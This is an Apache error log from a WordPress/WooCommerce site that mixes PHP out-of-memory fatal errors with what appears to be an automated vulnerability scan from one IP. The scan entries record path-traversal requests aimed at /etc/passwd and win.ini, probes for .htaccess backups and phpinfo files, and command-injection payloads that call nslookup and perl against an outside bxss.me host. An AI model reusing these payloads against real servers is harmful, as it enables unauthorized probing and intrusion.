[Thu Jul 08 01:17:50.300828 2021] [php7:error] [pid 7411] [client 27.147.202.214:2643] PHP Fatal error:  Out of memory (allocated 25165824) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/packages/action-scheduler/classes/abstracts/ActionScheduler_Lock.php on line 1
[Thu Jul 08 01:17:50.303522 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] PHP Fatal error:  Out of memory (allocated 12582912) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/class-avada-upgrade.php on line 343
[Thu Jul 08 01:17:50.346744 2021] [php7:error] [pid 7442] [client 27.147.202.214:4908] PHP Fatal error:  Out of memory (allocated 37748736) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/jetpack/vendor/automattic/jetpack-identity-crisis/src/class-identity-crisis.php on line 914
[Thu Jul 08 01:17:50.734450 2021] [authz_core:error] [pid 7457] [client 27.147.202.214:3230] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/images/.htaccess~
[Thu Jul 08 01:17:51.182356 2021] [core:error] [pid 7381] [client 27.147.202.214:6491] AH00126: Invalid URI in request GET /icons//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:17:51.606353 2021] [authz_core:error] [pid 7457] [client 27.147.202.214:3230] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/images/.htaccess.old
[Thu Jul 08 01:17:51.816012 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] PHP Fatal error:  Out of memory (allocated 12582912) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/shortcodes/components/related.php on line 409
[Thu Jul 08 01:17:51.937289 2021] [authz_core:error] [pid 7457] [client 27.147.202.214:3230] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/images/.htaccess.save
[Thu Jul 08 01:17:52.787998 2021] [php7:error] [pid 7522] [client 27.147.202.214:9672] PHP Fatal error:  Out of memory (allocated 16777216) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/includes/wc-deprecated-functions.php on line 517
[Thu Jul 08 01:17:52.800036 2021] [php7:error] [pid 7436] [client 27.147.202.214:2619] PHP Fatal error:  Out of memory (allocated 6291456) (tried to allocate 4096 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wordpress-seo/admin/class-yoast-notification-center.php on line 91
[Thu Jul 08 01:17:52.804100 2021] [php7:error] [pid 7522] [client 27.147.202.214:9672] PHP Fatal error:  Out of memory (allocated 16777216) (tried to allocate 65536 bytes) in Unknown on line 0
[Thu Jul 08 01:17:52.808797 2021] [php7:error] [pid 7436] [client 27.147.202.214:2619] PHP Fatal error:  Out of memory (allocated 6291456) (tried to allocate 4096 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-hook.php on line 276
[Thu Jul 08 01:17:53.305412 2021] [php7:error] [pid 7417] [client 27.147.202.214:2644] PHP Fatal error:  Out of memory (allocated 18874368) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/shortcodes/fusion-container.php on line 191
[Thu Jul 08 01:17:53.307370 2021] [php7:error] [pid 7417] [client 27.147.202.214:2644] PHP Fatal error:  Out of memory (allocated 18874368) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-fatal-error-handler.php on line 51
[Thu Jul 08 01:17:54.633958 2021] [negotiation:error] [pid 7599] [client 27.147.202.214:9791] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/wp-admin/import (None could be negotiated).
[Thu Jul 08 01:17:55.460123 2021] [php7:error] [pid 7392] [client 27.147.202.214:7688] script '/var/www/html/bubandcompany.com/upgrade.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:17:56.230295 2021] [authz_core:error] [pid 7525] [client 27.147.202.214:4878] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/.htaccess~
[Thu Jul 08 01:17:56.562909 2021] [authz_core:error] [pid 7525] [client 27.147.202.214:4878] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/.htaccess.old
[Thu Jul 08 01:17:56.898055 2021] [authz_core:error] [pid 7525] [client 27.147.202.214:4878] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/.htaccess.save
[Thu Jul 08 01:17:57.645043 2021] [php7:error] [pid 7522] [client 27.147.202.214:7705] script '/var/www/html/bubandcompany.com/wp-admin/images/phpinfo.php' not found or unable to stat
[Thu Jul 08 01:17:58.663919 2021] [php7:error] [pid 7522] [client 27.147.202.214:7705] script '/var/www/html/bubandcompany.com/wp-admin/images/pi.php' not found or unable to stat
[Thu Jul 08 01:17:59.406453 2021] [php7:error] [pid 7398] [client 27.147.202.214:7693] PHP Fatal error:  Out of memory (allocated 29360128) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wordpress-seo/inc/class-wpseo-utils.php on line 889
[Thu Jul 08 01:18:00.091650 2021] [php7:error] [pid 7598] [client 27.147.202.214:7697] script '/var/www/html/bubandcompany.com/wp-admin/images/php.php' not found or unable to stat
[Thu Jul 08 01:18:00.146078 2021] [core:error] [pid 7529] [client 27.147.202.214:6508] AH00126: Invalid URI in request GET /icons//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:18:00.270830 2021] [php7:error] [pid 7524] [client 204.48.19.85:57084] PHP Fatal error:  Out of memory (allocated 27262976) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/shortcodes/fusion-tabs.php on line 673, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721462.5027890205383300781250
[Thu Jul 08 01:18:00.279416 2021] [php7:error] [pid 7524] [client 204.48.19.85:57084] PHP Fatal error:  Out of memory (allocated 27262976) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-fatal-error-handler.php on line 40, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721462.5027890205383300781250
[Thu Jul 08 01:18:00.496099 2021] [authz_core:error] [pid 6979] [client 27.147.202.214:5604] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/css/.htaccess~
[Thu Jul 08 01:18:00.632263 2021] [php7:error] [pid 7221] [client 27.147.202.214:11738] PHP Fatal error:  Out of memory (allocated 18874368) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/inc/helpers.php on line 1980
[Thu Jul 08 01:18:00.640557 2021] [php7:error] [pid 7221] [client 27.147.202.214:11738] PHP Fatal error:  Out of memory (allocated 18874368) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-fatal-error-handler.php on line 72
[Thu Jul 08 01:18:01.010646 2021] [php7:error] [pid 7598] [client 27.147.202.214:7697] script '/var/www/html/bubandcompany.com/wp-admin/images/i.php' not found or unable to stat
[Thu Jul 08 01:18:01.156034 2021] [php7:error] [pid 7516] [client 27.147.202.214:5610] PHP Fatal error:  Out of memory (allocated 10485760) (tried to allocate 8192 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/packages/woocommerce-blocks/src/StoreApi/Schemas/CartItemSchema.php on line 78, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:18:01.183101 2021] [php7:error] [pid 7516] [client 27.147.202.214:5610] PHP Fatal error:  Out of memory (allocated 10485760) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-hook.php on line 276, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:18:01.341773 2021] [php7:error] [pid 7598] [client 27.147.202.214:7697] script '/var/www/html/bubandcompany.com/wp-admin/images/test.php' not found or unable to stat
[Thu Jul 08 01:18:01.366003 2021] [authz_core:error] [pid 6979] [client 27.147.202.214:5604] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/css/.htaccess.old
[Thu Jul 08 01:18:01.684945 2021] [php7:error] [pid 7598] [client 27.147.202.214:7697] script '/var/www/html/bubandcompany.com/wp-admin/images/temp.php' not found or unable to stat
[Thu Jul 08 01:18:01.698191 2021] [authz_core:error] [pid 6979] [client 27.147.202.214:5604] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/css/.htaccess.save
[Thu Jul 08 01:18:01.740725 2021] [php7:error] [pid 7522] [client 27.147.202.214:7705] script '/var/www/html/bubandcompany.com/import.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:18:02.026973 2021] [php7:error] [pid 7598] [client 27.147.202.214:7697] script '/var/www/html/bubandcompany.com/wp-admin/images/info.php' not found or unable to stat
[Thu Jul 08 01:18:02.148368 2021] [php7:error] [pid 7449] [client 27.147.202.214:6504] PHP Fatal error:  Out of memory (allocated 4194304) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/mailchimp-for-woocommerce/bootstrap.php on line 13
[Thu Jul 08 01:18:02.163133 2021] [php7:error] [pid 7449] [client 27.147.202.214:6504] PHP Fatal error:  Out of memory (allocated 4194304) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-includes/pluggable.php on line 1
[Thu Jul 08 01:18:03.858928 2021] [core:error] [pid 7412] [client 27.147.202.214:5658] AH00126: Invalid URI in request GET /icons//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:18:07.402710 2021] [negotiation:error] [pid 7528] [client 27.147.202.214:10738] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/wp-admin/update-core (None could be negotiated).
[Thu Jul 08 01:18:07.746474 2021] [php7:error] [pid 7457] [client 27.147.202.214:3230] script '/var/www/html/bubandcompany.com/update-core.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:18:12.337496 2021] [php7:error] [pid 7381] [client 27.147.202.214:7698] PHP Fatal error:  Out of memory (allocated 31457280) (tried to allocate 12288 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/jetpack/extensions/blocks/calendly/calendly.php on line 126
[Thu Jul 08 01:18:12.848269 2021] [php7:error] [pid 7599] [client 27.147.202.214:9791] PHP Fatal error:  Out of memory (allocated 58720256) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/class-avada-widget-style.php on line 478
[Thu Jul 08 01:18:12.860700 2021] [php7:error] [pid 7599] [client 27.147.202.214:9791] PHP Fatal error:  Out of memory (allocated 58720256) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-error.php on line 227
[Thu Jul 08 01:18:12.866247 2021] [php7:error] [pid 7531] [client 27.147.202.214:4912] PHP Fatal error:  Out of memory (allocated 77594624) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/options/lightbox.php on line 27
[Thu Jul 08 01:18:12.847777 2021] [php7:error] [pid 7411] [client 204.48.19.85:57286] PHP Fatal error:  Out of memory (allocated 12582912) (tried to allocate 131072 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/options/sidebars.php on line 621, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721473.9304790496826171875000
[Thu Jul 08 01:18:12.889734 2021] [php7:error] [pid 7398] [client 27.147.202.214:5660] PHP Fatal error:  Out of memory (allocated 14680064) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-hook.php on line 76
[Thu Jul 08 01:18:12.903430 2021] [php7:error] [pid 7398] [client 27.147.202.214:5660] PHP Fatal error:  Out of memory (allocated 14680064) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-fatal-error-handler.php on line 72
[Thu Jul 08 01:18:14.788792 2021] [core:error] [pid 7518] (36)File name too long: [client 27.147.202.214:6497] AH00036: access to /icons/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/usr/share/apache2/icons/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 01:18:15.969859 2021] [core:error] [pid 7411] (36)File name too long: [client 27.147.202.214:13597] AH00036: access to /;(nslookup hitxhyqniwcuv2429d.bxss.me||perl -e "gethostbyname('hitxhyqniwcuv2429d.bxss.me')")|(nslookup hitxhyqniwcuv2429d.bxss.me||perl -e "gethostbyname('hitxhyqniwcuv2429d.bxss.me')")&(nslookup hitxhyqniwcuv2429d.bxss.me||perl -e "gethostbyname('hitxhyqniwcuv2429d.bxss.me')")/upgrade.php failed (filesystem path '/var/www/html/bubandcompany.com/;(nslookup hitxhyqniwcuv2429d.bxss.me||perl -e "gethostbyname('hitxhyqniwcuv2429d.bxss.me')")|(nslookup hitxhyqniwcuv2429d.bxss.me||perl -e "gethostbyname('hitxhyqniwcuv2429d.bxss.me')")&(nslookup hitxhyqniwcuv2429d.bxss.me||perl -e "gethostbyname('hitxhyqniwcuv2429d.bxss.me')")')
[Thu Jul 08 01:18:20.463071 2021] [php7:error] [pid 7519] [client 27.147.202.214:6503] PHP Fatal error:  Out of memory (allocated 8388608) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-includes/general-template.php on line 3830
[Thu Jul 08 01:18:21.494534 2021] [php7:error] [pid 7221] [client 27.147.202.214:5656] PHP Fatal error:  Out of memory (allocated 31457280) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/includes/admin/class-wc-admin-post-types.php on line 878, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:18:21.603804 2021] [php7:error] [pid 7221] [client 27.147.202.214:5656] PHP Fatal error:  Out of memory (allocated 31457280) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-fatal-error-handler.php on line 152, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:18:21.627823 2021] [php7:error] [pid 7436] [client 27.147.202.214:5650] PHP Fatal error:  Out of memory (allocated 27262976) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/includes/log-handlers/class-wc-log-handler-file.php on line 431
[Thu Jul 08 01:18:21.628987 2021] [php7:error] [pid 7598] [client 27.147.202.214:7697] PHP Fatal error:  Out of memory (allocated 41943040) (tried to allocate 4096 bytes) in /var/www/html/bubandcompany.com/wp-includes/pluggable.php on line 2555
[Thu Jul 08 01:18:21.678705 2021] [php7:error] [pid 7436] [client 27.147.202.214:5650] PHP Fatal error:  Out of memory (allocated 27262976) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-error.php on line 190
[Thu Jul 08 01:18:22.346542 2021] [core:error] [pid 7381] (36)File name too long: [client 27.147.202.214:13596] AH00036: access to /;(nslookup hitifwkviizmqe36f3.bxss.me||perl -e "gethostbyname('hitifwkviizmqe36f3.bxss.me')")|(nslookup hitifwkviizmqe36f3.bxss.me||perl -e "gethostbyname('hitifwkviizmqe36f3.bxss.me')")&(nslookup hitifwkviizmqe36f3.bxss.me||perl -e "gethostbyname('hitifwkviizmqe36f3.bxss.me')")/update-core.php failed (filesystem path '/var/www/html/bubandcompany.com/;(nslookup hitifwkviizmqe36f3.bxss.me||perl -e "gethostbyname('hitifwkviizmqe36f3.bxss.me')")|(nslookup hitifwkviizmqe36f3.bxss.me||perl -e "gethostbyname('hitifwkviizmqe36f3.bxss.me')")&(nslookup hitifwkviizmqe36f3.bxss.me||perl -e "gethostbyname('hitifwkviizmqe36f3.bxss.me')")')
[Thu Jul 08 01:18:29.960632 2021] [core:error] [pid 7409] (36)File name too long: [client 27.147.202.214:9519] AH00036: access to /;(nslookup hitgdlmhhebog03dba.bxss.me||perl -e "gethostbyname('hitgdlmhhebog03dba.bxss.me')")|(nslookup hitgdlmhhebog03dba.bxss.me||perl -e "gethostbyname('hitgdlmhhebog03dba.bxss.me')")&(nslookup hitgdlmhhebog03dba.bxss.me||perl -e "gethostbyname('hitgdlmhhebog03dba.bxss.me')")/import.php failed (filesystem path '/var/www/html/bubandcompany.com/;(nslookup hitgdlmhhebog03dba.bxss.me||perl -e "gethostbyname('hitgdlmhhebog03dba.bxss.me')")|(nslookup hitgdlmhhebog03dba.bxss.me||perl -e "gethostbyname('hitgdlmhhebog03dba.bxss.me')")&(nslookup hitgdlmhhebog03dba.bxss.me||perl -e "gethostbyname('hitgdlmhhebog03dba.bxss.me')")')
[Thu Jul 08 01:18:43.561236 2021] [core:error] [pid 7525] [client 27.147.202.214:4878] AH00126: Invalid URI in request GET /icons//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:18:43.895025 2021] [core:error] [pid 7522] [client 27.147.202.214:7705] AH00126: Invalid URI in request GET /icons//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:18:46.809996 2021] [core:error] [pid 7599] [client 27.147.202.214:2117] AH00126: Invalid URI in request GET /icons//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:18:47.135062 2021] [core:error] [pid 5686] [client 27.147.202.214:7796] AH00126: Invalid URI in request GET /icons//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
